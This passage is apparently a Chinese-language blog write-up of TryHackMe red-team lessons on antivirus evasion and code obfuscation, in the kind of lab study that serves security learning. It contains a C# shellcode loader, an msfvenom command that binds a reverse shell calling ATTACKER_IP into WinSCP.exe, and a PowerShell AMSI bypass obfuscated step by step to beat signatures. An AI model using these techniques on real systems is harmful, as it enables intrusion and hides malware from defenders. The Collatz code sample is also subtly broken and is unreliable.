</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF">)</span><span style="color: #E5C07B">encoded</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Copy</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">encoded</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)(</span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF">), </span><span style="color: #E5C07B">encoded</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">parameter</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">parameter</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0xFFFFFFFF</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">  }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>然后正常传过去上线就行了，不过这个也同样会被检测到。</p><h3 id="打包器"><a href="#打包器" class="headerlink" title="打包器"></a>打包器</h3><p>这个就是传统意义上的加壳嘛，让可执行文件在不改变功能的情况下去压缩和混淆他的代码，其实和上面的编码和加密有点像，不过有 VMP 这种高级的壳，直接虚拟了一个运行环境转义来运行了，更高级了。</p><p>普通的加壳在执行之后扫内存可以解，房间里面介绍了一个 <a href="https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0">ConfuserEx</a> 的加壳工具。</p><h3 id="捆绑器"><a href="#捆绑器" class="headerlink" title="捆绑器"></a>捆绑器</h3><p><strong>绑定器</strong>是一种将恶意可执行文件（payload）与一个或多个合法程序合并成一个新可执行文件的工具。它的主要目的是<strong>欺骗用户</strong>，让他们以为自己正在运行一个正常程序，而实际上恶意代码也在背后静默执行，绑定器本身<strong>不具备规避杀毒软件（AV）的能力</strong>。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">WinSCP.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-k</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lhost=ATTACKER_IP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lport=</span><span style="color: #D19A66">7779</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">WinSCP-evil.exe</span></span></code></pre></div></div></figure><h1 id="Obfuscation-Principles-混淆原理"><a href="#Obfuscation-Principles-混淆原理" class="headerlink" title="Obfuscation Principles 混淆原理"></a>Obfuscation Principles 混淆原理</h1><p>混淆是检测规避方法和防止恶意软件分析的重要组成部分。混淆最初是为了保护软件和知识产权不被窃取或复制。虽然它仍然广泛用于其最初目的，但攻击者已将其用于恶意目的。</p><h2 id="Origins-of-Obfuscation-混淆起源"><a href="#Origins-of-Obfuscation-混淆起源" class="headerlink" title="Origins of Obfuscation 混淆起源"></a>Origins of Obfuscation 混淆起源</h2><p>混淆广泛运用在软件相关领域，为了保护应用程序的知识产权和其他机密信息。</p><p>Minecraft 使用 <a href="https://github.com/Guardsquare/proguard">ProGuard</a> 混淆器去混淆他的 Java 类。同时他还发布了有限的混淆信息映射，作为旧的未混淆类和新的混淆类之间的转换器，以支持模组社区。</p><p>上述的只是混淆在公众领域运用的一个例子。为了记录和组织各种混淆方法，我们可以参考<a href="https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf">《分层混淆：一种用于分层安全的软件混淆技术分类法》</a>这篇论文。这篇研究论文按照层级组织混淆方法，类似于 OSI 模型，但针对的是应用程序数据流。</p><img src="/thm_rthe/image-20250826231518499.png" class="" title="image-20250826231518499"><p>每个子层都有具体的混淆方法，这个房间中主要关注的是 Code-Element 层的内容。</p><img src="/thm_rthe/image-20250826222554241.png" class="" title="image-20250826222554241"><p>要使用这个战略，我们可以确定一个目标，然后选择一个符合我们要求的方法。例如，假设我们想混淆代码的布局但不能修改现有代码。在这种情况下，我们可以注入垃圾代码，如分类法所总结的：<code>Code Element Layer</code> &gt; <code>Obfuscating Layout</code> &gt; <code>Junk Codes</code>，但它如何被恶意利用呢？</p><h2 id="Obfuscation’s-Function-for-Static-Evasion-混淆在静态规避中的作用"><a href="#Obfuscation’s-Function-for-Static-Evasion-混淆在静态规避中的作用" class="headerlink" title="Obfuscation’s Function for Static Evasion 混淆在静态规避中的作用"></a>Obfuscation’s Function for Static Evasion 混淆在静态规避中的作用</h2><p>这一节提到的是 Obfuscating Data，在恶意程序中隐藏其可识别的恶意代码，使其看起来像一个合法程序。</p><table><thead><tr><th><strong>混淆方法</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td>数组转换</td><td>通过分割、合并、折叠和展平来转换数组</td></tr><tr><td>数据编码</td><td>使用数学函数或密码对数据进行编码</td></tr><tr><td>数据程序化</td><td>用过程调用代替静态数据</td></tr><tr><td>数据拆分&#x2F;合并</td><td>将一个变量的信息分散到几个新变量中</td></tr></tbody></table><p>因为静态签名容易被绕过，所以接下来用数据拆分&#x2F;合并来举例。</p><h3 id="Object-Concatenation-对象拼接"><a href="#Object-Concatenation-对象拼接" class="headerlink" title="Object Concatenation 对象拼接"></a>Object Concatenation 对象拼接</h3><p>拼接在恶意软件中最常见的应用是破坏目标静态签名，攻击者还可以预先使用它来分解程序的所有对象，并尝试一次性删除所有签名，而无需逐个查找。</p><p>下面是一个 Yara 规则的示例，我们会用拼接去规避掉这个静态特征。</p><figure class="shiki yara"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre><code>rule ExampleRule{    strings:        $text_string = "AmsiScanBuffer"        $hex_string = { B8 57 00 07 80 C3 }    condition:        $my_text_string or $my_hex_string}</code></pre></div></div></figure><p>当使用 Yara 扫描编译后的二进制文件时，如果存在定义的字符串，它将创建积极的警报&#x2F;检测。通过连接，字符串在功能上可以相同，但在扫描时会显示为两个独立的字符串，从而不会触发警报。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 原代码</span></span><span class="line"><span style="color: #ABB2BF">IntPtr ASBPtr </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">TargetDLL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;AmsiScanBuffer&quot;</span><span style="color: #ABB2BF">); </span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 输入字符串拼接</span></span><span class="line"><span style="color: #ABB2BF">IntPtr ASBPtr </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">TargetDLL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;Amsi&quot;</span><span style="color: #E06C75"> </span><span style="color: #C678DD">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;Scan&quot;</span><span style="color: #E06C75"> </span><span style="color: #C678DD">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;Buffer&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>从字符串拼接技术延伸，攻击者还可以使用<strong>无效字符</strong>（或<strong>填充字符</strong>）来干扰或混淆静态签名。这些字符可以单独使用，也可以与字符串拼接结合使用，具体取决于签名的强度和实现方式。下表列出了一些我们可以利用的常见无效字符。</p><table><thead><tr><th>**Character **</th><th>**Purpose **</th><th><strong>Example</strong></th></tr></thead><tbody><tr><td>分隔</td><td>将单个字符串拆分为多个子字符串并进行组合</td><td><code>(&#39;co&#39;+&#39;ffe&#39;+&#39;e&#39;)</code></td></tr><tr><td>重排</td><td>重新排列字符串的组成部分</td><td><code>(&#39;&#123;1&#125;&#123;0&#125;&#39;-f&#39;ffee&#39;,&#39;co&#39;)</code></td></tr><tr><td>空白字符</td><td>包含未被解析的空白字符</td><td><code>.( &#39;Ne&#39; +&#39;w-Ob&#39; + &#39;ject&#39;)</code></td></tr><tr><td>反引号（Tick）</td><td>包含未被解析的反引号</td><td><code>d</code>own<code>LoAd</code>Stri<code>ng</code></td></tr><tr><td>随机大小写</td><td>Tokens 通常不区分大小写，可以是任意大小写形式</td><td><code>dOwnLoAdsTRing</code></td></tr></tbody></table><h4 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h4><p>混淆这段代码试试，我估计就是 <code>Amsi</code> 这种关键字作祟。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;amsiInitFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 第一版</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;Sys&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tem.Manag&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ement.Au&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tomation.Am&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;siU&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;am&#39;</span><span style="color: #56B6C2">+</span><span style="color: #98C379">&#39;siIn&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;itFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonP&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ublic,S&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tatic&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 失败了，拆解一下检测点看看</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这个不能过</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这个能过</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;Sys&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tem.Manag&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ement.Au&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tomation.Am&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;siU&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tils&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这个也能过</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;Sys&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tem.Manag&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ement.Au&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tomation.Am&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;siU&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;am&#39;</span><span style="color: #56B6C2">+</span><span style="color: #98C379">&#39;siIn&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;itFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonP&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ublic,S&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tatic&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 那就是最后一部分了</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这里检测的其实是 SetValue，可以把这个抽离出来作为变量传进去</span></span><span class="line"><span style="color: #E06C75">$Value</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;SetValue&quot;</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;Sys&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tem.Manag&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ement.Au&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tomation.Am&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;siU&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;am&#39;</span><span style="color: #56B6C2">+</span><span style="color: #98C379">&#39;siIn&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;itFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonP&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ublic,S&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;tatic&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #E06C75">$Value</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><h2 id="Obfuscation’s-Function-for-Analysis-Deception-混淆在分析欺骗中的作用"><a href="#Obfuscation’s-Function-for-Analysis-Deception-混淆在分析欺骗中的作用" class="headerlink" title="Obfuscation’s Function for Analysis Deception 混淆在分析欺骗中的作用"></a>Obfuscation’s Function for Analysis Deception 混淆在分析欺骗中的作用</h2><p>虽然混淆能绕过软件检测，但是他依然会被人为检测到（毕竟人不是死的），所以可以利用一些逻辑和数学去创建一些难以理解的代码。</p><p>如果你想知道更多的逆向知识，推荐完成<a href="https://tryhackme.com/module/malware-analysis">恶意软件分析模块</a>。</p><p>下表列出了分类法中混淆布局和混淆控制子层所涵盖的方法。</p><table><thead><tr><th><strong>混淆方法</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td>垃圾代码</td><td>添加没有用的垃圾指令，也叫代码存根</td></tr><tr><td>分离相关代码</td><td>分离相关代码或者指令，增加阅读程序的难度</td></tr><tr><td>剥离冗余符号</td><td>剥离符号信息，例如调试信息或其他符号表</td></tr><tr><td>无意义标识符</td><td>将有意义的标识符转换为无意义的标识符</td></tr><tr><td>隐式控制</td><td>将显式控制指令转换为隐式指令</td></tr><tr><td>基于调度器的控制</td><td>在运行时确定要执行的下一个块</td></tr><tr><td>概率控制流</td><td>引入具有相同语义但不同语法的控制流</td></tr><tr><td>虚假控制流</td><td>故意添加到程序中但永不执行的控制流</td></tr></tbody></table><p>上面的只是给一个概念性的认知，每种技术都有挺深的运用了，就留给你们自己探索了。如果碰到不懂的概念要及时查清楚，就比如标识符和符号的区别是什么。</p><h3 id="Code-Flow-and-Logic-代码流和逻辑"><a href="#Code-Flow-and-Logic-代码流和逻辑" class="headerlink" title="Code Flow and Logic 代码流和逻辑"></a>Code Flow and Logic 代码流和逻辑</h3><p><strong>控制流</strong>是程序执行的骨架，它决定了代码的逻辑走向，比如 <code>if/else</code> 判断和循环。程序通常自上而下执行，直到遇到逻辑语句。<strong>控制流图（CFG）</strong>就是用来可视化这些逻辑路径的。</p><p><strong>攻击者如何利用控制流？</strong></p><p>对攻击者来说，控制流既是一个挑战，也是一个机会。安全分析师可以通过分析程序的控制流来理解其功能，这会暴露恶意意图。</p><p>然而，攻击者可以利用这一点，通过<strong>操纵控制流</strong>来混淆代码。他们的目标是引入<strong>复杂且无意义的逻辑</strong>，使得控制流变得<strong>任意混乱</strong>。这会：</p><ul><li><strong>迷惑分析师</strong>：让逆向工程师很难看懂代码的真实执行路径。</li><li><strong>规避检测</strong>：通过改变代码的结构，使其不再符合杀毒软件已知的恶意行为模式。</li></ul><h4 id="Arbitrary-Control-Flow-Patterns-任意控制流模式"><a href="#Arbitrary-Control-Flow-Patterns-任意控制流模式" class="headerlink" title="Arbitrary Control Flow Patterns 任意控制流模式"></a>Arbitrary Control Flow Patterns 任意控制流模式</h4><p><strong>任意控制流（Arbitrary Control Flow）</strong>指的是恶意软件开发者通过人为设计和混淆，使程序的执行路径变得复杂、非线性、难以预测和分析。</p><p>为了实现这种复杂的控制流，开发者会利用数学、逻辑或其他复杂算法，将不同的控制流模式注入到恶意代码中。这些算法的核心是<strong>谓词（Predicates）</strong>，即那些只返回真或假值的判断式。从高层次看，我们可以将谓词理解为 <code>if</code> 语句中的条件，它决定了代码块是否执行。</p><h5 id="不透明谓词-Opaque-Predicates"><a href="#不透明谓词-Opaque-Predicates" class="headerlink" title="不透明谓词 (Opaque Predicates)"></a><strong>不透明谓词 (Opaque Predicates)</strong></h5><p>在混淆技术中，<strong>不透明谓词</strong>是实现任意控制流的关键。正如之前提到的那篇论文所指出的，不透明谓词是一种<strong>其值对开发者已知但难以被逆向分析者推断</strong>的谓词。</p><p>举例来说，一个不透明谓词的数学表达式可能非常复杂，但开发者知道它的结果永远为真。当分析师试图理解这段代码时，他们会认为这里存在两种执行路径，但实际上只有一条是可行的。</p><p>不透明谓词属于<strong>虚假控制流</strong>和<strong>概率控制流</strong>方法。它可以与<strong>垃圾代码</strong>等其他混淆方法无缝结合，任意地向程序中添加虚假逻辑，或重构现有函数的控制流，从而使逆向工程变得异常艰巨。</p><p>虽然深入研究不透明谓词需要扎实的数学和计算基础，但在后续的分析中，我们将观察它的一个常见应用示例。</p><h5 id="考拉兹猜想（The-Collatz-Conjecture）"><a href="#考拉兹猜想（The-Collatz-Conjecture）" class="headerlink" title="考拉兹猜想（The Collatz Conjecture）"></a>考拉兹猜想（The Collatz Conjecture）</h5><p><strong>考拉兹猜想</strong>是一个常被用作不透明谓词的数学问题。该猜想指出，如果对任意一个正整数重复应用以下两个算术运算，最终都将得到 1。</p><ul><li><strong>如果该数为偶数，将其除以 2。</strong></li><li><strong>如果该数为奇数，将其乘以 3 再加 1。</strong></li></ul><p>这个猜想的可用之处在于，我们已知对于任何正整数输入，其输出结果最终都将是 1。这个确定的输出使得它成为一个可靠的<strong>不透明谓词</strong>。</p><p>下面是考拉兹猜想在 Python 中的示例。</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">x </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #C678DD">while</span><span style="color: #ABB2BF">(x </span><span style="color: #56B6C2">&gt;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(x</span><span style="color: #56B6C2">%</span><span style="color: #D19A66">2</span><span style="color: #56B6C2">==</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF">x</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">x</span><span style="color: #56B6C2">*</span><span style="color: #D19A66">3</span><span style="color: #56B6C2">+</span><span style="color: #D19A66">1</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">else</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">x</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">x</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">2</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(x</span><span style="color: #56B6C2">==</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hello!&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><p><code>while (x &gt; 1)</code> 这个条件就是我们所说的<strong>谓词</strong>。考拉兹猜想的数学特性保证了，只要 <code>x</code> 是一个大于 1 的正整数，这个循环最终都会结束，并且 <code>x</code> 的值会变为 <code>1</code>。也就是说，<code>x &gt; 1</code> 这个条件最终会变为假，但它<strong>必然会执行</strong>循环体内的代码。</p><p>对于开发者来说，他们知道这个循环最终会结束。但对于<strong>静态分析</strong>工具或逆向分析师来说，他们无法轻易地推断出这个循环何时会结束，或者 <code>x</code> 的最终值是什么。这段代码的逻辑看似复杂，但它的最终结果是<strong>确定且可预测</strong>的。</p><h3 id="Protecting-and-Stripping-Identifiable-Information-保护和剥离可识别信息"><a href="#Protecting-and-Stripping-Identifiable-Information-保护和剥离可识别信息" class="headerlink" title="Protecting and Stripping Identifiable Information 保护和剥离可识别信息"></a>Protecting and Stripping Identifiable Information 保护和剥离可识别信息</h3><p><strong>可识别信息</strong>是逆向分析恶意软件的关键线索。通过隐藏或剥离这些信息，攻击者可以极大地增加分析师理解程序功能的难度。这些可识别信息主要分为三类：<strong>代码结构</strong>、<strong>对象名称</strong>（Object Names）和<strong>文件&#x2F;编译属性</strong>。</p><h4 id="对象名称混淆"><a href="#对象名称混淆" class="headerlink" title="对象名称混淆"></a><strong>对象名称混淆</strong></h4><p>对象名称，如变量名和函数名，能直接揭示代码的用途。尽管分析师可以通过行为分析来推断其功能，但如果没有这些上下文，难度会呈指数级上升。这种混淆方法也被称为<strong>词法混淆（Lexical Obfuscation）</strong>，它将有意义的标识符（例如，<code>checkPassword</code>）转换为无意义的名称（例如，<code>a</code> 或 <code>_123</code>）。</p><ul><li><strong>编译型语言 vs. 解释型语言</strong>：<ul><li>在 <strong>Python</strong> 或 <strong>PowerShell</strong> 等<strong>解释型语言</strong>中，所有对象名称在运行时都可见，因此所有名称都必须被混淆。</li><li>在 <strong>C</strong> 或 <strong>C++</strong> 等<strong>编译型语言</strong>中，大多数本地变量名会在编译时被丢弃，但全局变量和函数名通常会保留在二进制文件中。此外，出现在字符串中的对象名称也需要特别处理，因为它们在运行时会被保留。</li></ul></li><li><strong>混淆技术</strong>：为了使混淆后的标识符更具迷惑性，攻击者会故意使用相同的名称来命名不同类型或不同作用域的对象。这种方法已被像 <strong>ProGuard</strong> 这样的 Java 混淆工具所采用。</li></ul><h4 id="剥离符号信息"><a href="#剥离符号信息" class="headerlink" title="剥离符号信息"></a><strong>剥离符号信息</strong></h4><p>优秀的编程实践通常会采用有意义的命名规则，并且在编译后的软件中默认保留一些名称（如 C&#x2F;C++ 的全局变量名、Java 